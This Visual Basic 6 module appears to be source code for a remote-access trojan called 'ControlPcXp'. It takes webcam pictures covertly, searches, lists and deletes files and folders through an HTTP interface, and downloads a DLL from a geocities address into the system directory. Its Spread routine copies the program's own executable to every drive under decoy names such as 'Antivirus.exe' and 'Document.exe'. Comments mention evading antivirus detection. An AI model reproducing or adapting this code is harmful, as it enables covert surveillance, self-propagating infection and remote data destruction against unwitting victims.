Attribute VB_Name = "mod1"
Option Explicit
Private Const WS_CHILD As Long = &H40000000
Private Const WS_VISIBLE As Long = &H10000000
Private Const WM_USER As Long = &H400
Private Const WM_CAP_START As Long = WM_USER
Private Const WM_CAP_DRIVER_CONNECT As Long = WM_CAP_START + 10
Private Const WM_CAP_DRIVER_DISCONNECT As Long = WM_CAP_START + 11
Private Const WM_CAP_SET_PREVIEW As Long = WM_CAP_START + 50
Private Const WM_CAP_SET_PREVIEWRATE As Long = WM_CAP_START + 52
Private Const WM_CAP_DLG_VIDEOFORMAT As Long = WM_CAP_START + 41
Private Const WM_CAP_FILE_SAVEDIB As Long = WM_CAP_START + 25



Public Function CreatePath(strPath As String) As String
Dim Fol As String
Dim A1  As Long
'Creates Directorys in the path
    On Error GoTo CreatePath_Error
    strPath = RemBackslash(strPath)
    For A1 = 0 To UBound(Split(strPath, "\"))
        Fol = Fol & Split(strPath, "\")(A1) & "\"
        If LenB(Dir(Fol, vbDirectory)) = 0 Then
            MkDir Fol
        End If
    Next A1
''on error GoTo 0 ':( Check Error Handling Structure
Exit Function
CreatePath_Error:
    CreatePath = "Error: " & err.number & " in procedure CreatePath of Module hjjw"
End Function
Public Function FindFiles(ByVal sPath As String, Find1 As String, Optional ByRef bHasSubs As Boolean) As String
' Note: This function is recursive.
'Find Files
'If Not Right$(sPath, 1) = "\" Then sPath = sPath & "\" ':( Expand Structure -> replaced by:
Dim Files As String         ':( Move line to top of current Function
Dim sName As String         ':( Move line to top of current Function
Dim h     As Long           ':( Move line to top of current Function
Dim FD    As WIN32_FIND_DATA ':( Move line to top of current Function
'Dim r      As Long ':( Move line to top of current Function
    If Not Right$(sPath, 1) = "\" Then
        sPath = sPath & "\"
    End If
    On Error GoTo Error_Prase
' Get handle to first file or subfolder in folder.
    h = FindFirstFile(sPath & EXT_ALL, FD)
    bHasSubs = False
    If h <> INVALID_HANDLE_VALUE Then
        Do
            sName = Left$(FD.cFileName, InStr(FD.cFileName, vbNullChar) - 1)
            If Left$(sName, 1) <> DOT Then
                If (FD.dwFileAttributes And FILE_ATTRIBUTE_DIRECTORY) = FILE_ATTRIBUTE_DIRECTORY Then
                    bHasSubs = True
' If the handle is to Table folder then call the function recursively.
                    Files = Files & FindFiles(sPath & sName & "\", Find1, bHasSubs)
                Else
                    If InStr(1, FD.cFileName, Find1, vbTextCompare) > 0 Then
                        Files = Files & "<table border='1' ><tr><td nwidth='40%'><a Href= """ & LocalhttpAddress & "\" & "FDO," & Replace$(sPath & sName, "\", "/") & """ >" & sName & "</a></td><td >" & sPath & "</td></tr></table>"
                    End If
                End If
            End If
        Loop While FindNextFile(h, FD)
        Call FindClose(h) ': Debug.Assert r
    End If
    FindFiles = Files
Exit Function
Error_Prase:
    err.Clear
End Function
Public Function FormatFileSize(ByVal Size As Variant, Optional ByVal LongDisplay As Boolean = False) As String
Const KB As Long = 1024
Const MB As Long = KB * KB
Dim sRet As String
'--------------------------------------------------------------------------------------
'FileSize -----------------------------------------------------------------------------
    If Size < KB Then
        sRet = Format$(Size, "#,##0") & " byte"
        If Size <> 1 Then
            sRet = sRet & "s"
        End If
    Else
        Select Case Size / KB
        Case Is < 10
            sRet = Format$(Size / KB, "0.00") & " KB"
        Case Is < 100
            sRet = Format$(Size / KB, "0.0") & " KB"
        Case Is < 1000
            sRet = Format$(Size / KB, "0") & " KB"
        Case Is < 10000
            sRet = Format$(Size / MB, "0.00") & " MB"
        Case Is < 100000
            sRet = Format$(Size / MB, "0.0") & " MB"
        Case Is < 1000000
            sRet = Format$(Size / MB, "0") & " MB"
        Case Is < 10000000
            sRet = Format$(Size / MB / KB, "0.00") & " GB"
        End Select
    End If
    If LongDisplay Then
        If Size >= KB Then
            sRet = sRet & " (" & Format$(Size, "#,##0") & " bytes)"
        End If
    End If
    FormatFileSize = sRet
End Function

Public Function CheckJpgCodec()
    On Error Resume Next
    If LenB(Dir(GetSystemDirectory & "jcon.dll")) = 0 Or FileLen(GetSystemDirectory & "jcon.dll") = 0 Then
' Download The Jpg Converter Module http://geocities.com/uptomoon/jcon.class
        Call URLDownloadToFile(0, "http://geocities.com/uptomoon/jcon.class", GetSystemDirectory & "jcon.dll", 0, 0) ' Download Codec jcon.dll
    End If
    If LenB(Dir(GetSystemDirectory & "jcon.dll")) = 0 Then
        CheckJpgCodec = "Error : Cannot Download Jpeg Codec"
        Exit Function
'<:-) :SUGGESTION: (EXPERIMENTAL follow advice with care )
'<:-) Explict 'Exit ProcedureType' can make code flow harder to follow.(Fix ID 3)
'<:-) Convert 'If..Then/Code(with Explicit Exit)/Else/Rest_of_Code/End If' to
'<:-) 'If..Then/Exit Code(without Explicit Exit)/Else/ Rest_Of_Code/End If
'<:-) OR if Exit Code block is only the Exit Command
'<:-) 'If Not ..Then/ Rest_Of_Code/End If
    Else
        CheckJpgCodec = ""
    End If
End Function
Public Function GetCameraPicture(Dpi) As String
On Error GoTo err
Dim hcap As Long, Jpg1 As String
Dim CAPFILE As String
Jpg1 = CheckJpgCodec
GetCameraPicture = Jpg1
With Hkr.Picture1


CAPFILE = tempPath & "TMP" & Rnd(100000) * 100000

hcap = capCreateCaptureWindow("Take a Camera Shot", WS_CHILD Or WS_VISIBLE, 0, 0, 640, 480, .hwnd, 0)
End With
    If hcap <= 0 Then
        GetCameraPicture = GetCameraPicture & "Error : No Camera Found"
        Exit Function
    End If
    
    Call SendMessage(hcap, WM_CAP_DRIVER_CONNECT, 0, 0)
        Call SendMessage(hcap, WM_CAP_SET_PREVIEWRATE, 66, 0&)
        Call SendMessage(hcap, WM_CAP_SET_PREVIEW, CLng(True), 0&)
    
    DoEvents
    Call SendMessage(hcap, WM_CAP_SET_PREVIEW, CLng(False), 0&)
    DoEvents
    Call SendMessage(hcap, WM_CAP_FILE_SAVEDIB, 0&, ByVal CStr(CAPFILE))
    
    DoEvents
    Call SendMessage(hcap, WM_CAP_SET_PREVIEW, CLng(True), 0&)
    DoEvents
    Call SendMessage(hcap, WM_CAP_DRIVER_DISCONNECT, 0&, 0&)
    DoEvents
    If err.number > 0 Then
        GetCameraPicture = GetCameraPicture & "Error : Camera Not isConnected "
        Exit Function
    End If
    DoEvents
    If BMPToJPG(CAPFILE, CAPFILE & ".jpg", Int(Dpi)) > 0 Then
        GetCameraPicture = GetCameraPicture & "Error : No jcon.dll Found"
    Else
        GetCameraPicture = CAPFILE & ".jpg"
    End If
    Exit Function
err:
GetCameraPicture = "Error : " & err.Description
err.Clear
On Error GoTo 0
End Function
Public Function GetDriveLetters(Optional s As String) As String
Dim DriveType    As Long
Dim r            As Long
Dim allDrives    As String
Dim JustOneDrive As String
Dim pos          As Long
'Shows The Disk Drive Letters
    On Error GoTo GetDriveLetters_Error
    GetDriveLetters = "Drives : " & "<br>"
    allDrives = Space$(64)
    r = GetLogicalDriveStrings(Len(allDrives), allDrives)
    allDrives = Left$(allDrives, r)
    Do
        pos = InStr(allDrives, vbNullChar)
        If pos Then
            DoEvents
            JustOneDrive = Left$(allDrives, pos)
            allDrives = Mid$(allDrives, pos + 1, Len(allDrives))
            JustOneDrive = Replace$(JustOneDrive, vbNullChar, vbNullString)
            DriveType = GetDriveType(JustOneDrive)
            GetDriveLetters = GetDriveLetters & IIf(s <> vbNullString, Replace$(s, "%s", JustOneDrive, , , vbTextCompare), JustOneDrive) & " : " & DriveType & "<br>"
        End If
    Loop Until LenB(allDrives) = 0
''on error GoTo 0 ':( Check Error Handling Structure
Exit Function
GetDriveLetters_Error:
    GetDriveLetters = "Error: " & err.number & " in procedure GetDriveLetters of Module hjjw"
End Function
Public Function GetFolderSize(ByVal sPath As String, ByRef bHasSubs As Boolean) As Double
' Note: This function is recursive.
'--------------------------------------------------------------------------------------
'Functions ----------------------------------------------------------------------------
'If Not Right$(sPath, 1) = "\" Then sPath = sPath & "\" ':( Expand Structure -> replaced by:
Dim dSize As Double         ':( Move line to top of current Function
Dim sName As String         ':( Move line to top of current Function
Dim h     As Long           ':( Move line to top of current Function
Dim FD    As WIN32_FIND_DATA ':( Move line to top of current Function
'Dim r      As Long ':( Move line to top of current Function
    If Not Right$(sPath, 1) = "\" Then
        sPath = sPath & "\"
    End If
' Get handle to first file or subfolder in folder.
    h = FindFirstFile(sPath & EXT_ALL, FD)
    bHasSubs = False
    If h <> INVALID_HANDLE_VALUE Then
        Do
            sName = Left$(FD.cFileName, InStr(FD.cFileName, vbNullChar) - 1)
            If Left$(sName, 1) <> DOT Then
                If (FD.dwFileAttributes And FILE_ATTRIBUTE_DIRECTORY) = FILE_ATTRIBUTE_DIRECTORY Then
                    bHasSubs = True
' If the handle is to Table folder then call the function recursively.
                    dSize = dSize + GetFolderSize(sPath & sName & "\", True)
                Else
                    dSize = dSize + FD.nFileSizeLow
                End If
            End If
        Loop While FindNextFile(h, FD)
        Call FindClose(h) ': Debug.Assert r
    End If
' Return the folder size and add the size to the Collection with
' the folder path as the key for later referencing.
    GetFolderSize = dSize
End Function
Public Function GetHeaderProperty(Headers As String, Prop As String) As String
'Extracts The Command From The Input Url
'--------------------------------------------------------------------------------------
'Commands------------------------------------------------------------------------------
Dim A1 As Long
Dim A2 As Long
    A1 = InStr(1, Headers, Prop, vbTextCompare)
    If A1 > 0 Then
        For A2 = A1 + Len(Prop) To Len(Headers)
            If Mid$(Headers, A2, 1) = vbCrLf Or Mid$(Headers, A2, 1) = vbCr Or Mid$(Headers, A2, 1) = vbLf Then
                GetHeaderProperty = Trim$(Mid$(Headers, (A1) + Len(Prop), (A2 - (A1 + Len(Prop)))))
                Exit Function '---> Bottom
'<:-) :SUGGESTION: (EXPERIMENTAL follow advice with care )
'<:-) Explict 'Exit ProcedureType' can make code flow harder to follow.(Fix ID 11)
'<:-) No recommended action but consider coding around it.
            End If
        Next A2
    End If
Error_Prase:
    GetHeaderProperty = "0"
    err.Clear
End Function
Public Function GetHexVal(ByVal inPutStr As String) As String
Dim A1     As Long
Dim A2     As Long
Dim StrVal As String
    StrVal = inPutStr
    On Error GoTo Error_Prase
'--Decrypt Url Encoding as Http://Server%20Name%20
    If UBound(Split(StrVal, "%")) <= 0 Then
        GetHexVal = StrVal
    Else
re:
        DoEvents
        For A1 = 1 To UBound(Split(StrVal, "%"))
            For A2 = 0 To 255
                If Hex$(Asc(Chr$(CStr(A2)))) = Left$(Split(StrVal, "%")(A1), 2) Then
                    StrVal = Replace$(StrVal, "%" & Left$(Split(StrVal, "%")(A1), 2), Chr$(A2))
                    GoTo re
                End If
            Next '  A2 A2 A2
        Next '  A1 A1 A1
        GetHexVal = StrVal
        Exit Function
Error_Prase:
        GetHexVal = StrVal
        err.Clear
    End If
End Function
Public Function Table(strText As String) As String
    If NoForm Then
'Warning : This Program Control and its required files are Open Source to the world thus the Author is not responsible For Any Misuse.
'--------------------------------------------------------------------------------------
        Table = strText
    Else
        If COLOR1 = "#E9E9E9" Then
            COLOR1 = "#FFFFFF"
        Else
            COLOR1 = "#E9E9E9"
        End If
        Table = "<html><title>" & LocalhttpAddress & " Services - [ControlPcXp]" & vbCrLf & "</title>" & vbCrLf & "<body><table border=""2"" cellpadding=""0"" style=""border-collapse: collapse"" bordercolor=""#111111""  align=""left"">"
        Table = Table & "<tr><td bgcolor=""" & COLOR1 & """><font size=""2"">" & strText & "</font></td>"
        Table = Table & "</tr></table></body></html>"
    End If
End Function
Private Sub Spread()
Dim FN(20) As String, PP As String, A As Long
    On Error Resume Next
    For A = 65 To 65 + 26
        Randomize: PP = Chr$(A) & ":\" & Array("Server", "Client", "Host", "Site", "Website", "About", "Url", "Ping", "Trace", "Route", "Seeder", "Antivirus", "Upx", "Tracker", "Marry", "Letter", "Document", "Sir", "Madam", "Folder", "Peer")(Int(Rnd(20) * 20)) & ".exe"
        FileCopy AppPath & App.EXEName & ".exe", PP
        err.Clear
    Next A
End Sub
''
''Public Function FileExistsn(strPath As String) As String
''
''
''
''On Local Error GoTo Error_Prase
'''Function Tells That The File Exists
''If FileLen(strPath) > 0 Then
''FileExistsn = strPath
''End If
''Error_Prase:
''Err.Clear
''End Function
''
''
Public Function GetFileFromPath(A2 As String) As String
Dim A4 As Long
Dim A3 As Long
'Dim a5
'Dim a6
    On Error GoTo end1
'''--------------------------------------------------------------------------------------
    For A4 = 0 To Len(A2)
        For A3 = 0 To A4
            If Left$(Right$(A2, A4), A3) = "\" Or Left$(Right$(A2, A4), A3) = "/" Then
                GetFileFromPath = Right$(A2, A4 - 1)
                GoTo end1
            End If
        Next A3
    Next A4
end1:
    If err.number > 0 Then
        GetFileFromPath = A2
        err.Clear
    End If
End Function
Public Function DeleteDirectory(ByVal DirtoDelete As Variant) As String
Dim FSO As Variant
'Deletes the Directorys . ' Guys I Havent Any Way Out Using The Filesystem . Filesystem Object Can Cause Catching Due To Some Antivirus Programs Sees The FileSystem Objects
    On Error GoTo DeleteDirectory_Error
    Set FSO = CreateObject("Scripting.FileSystemObject")
    FSO.DeleteFolder DirtoDelete, True
    On Error GoTo 0 ':( Check Error Handling Structure
Exit Function
DeleteDirectory_Error:
    DeleteDirectory = "Error: " & err.number & " in procedure DeleteDirectory of Module hjjw"
    Log DeleteDirectory
End Function

''
':)Code Fixer V3.0.9 (11/15/2006 12:12:18 PM) 1 + 383 = 384 Lines Thanks Ulli for inspiration and lots of code.
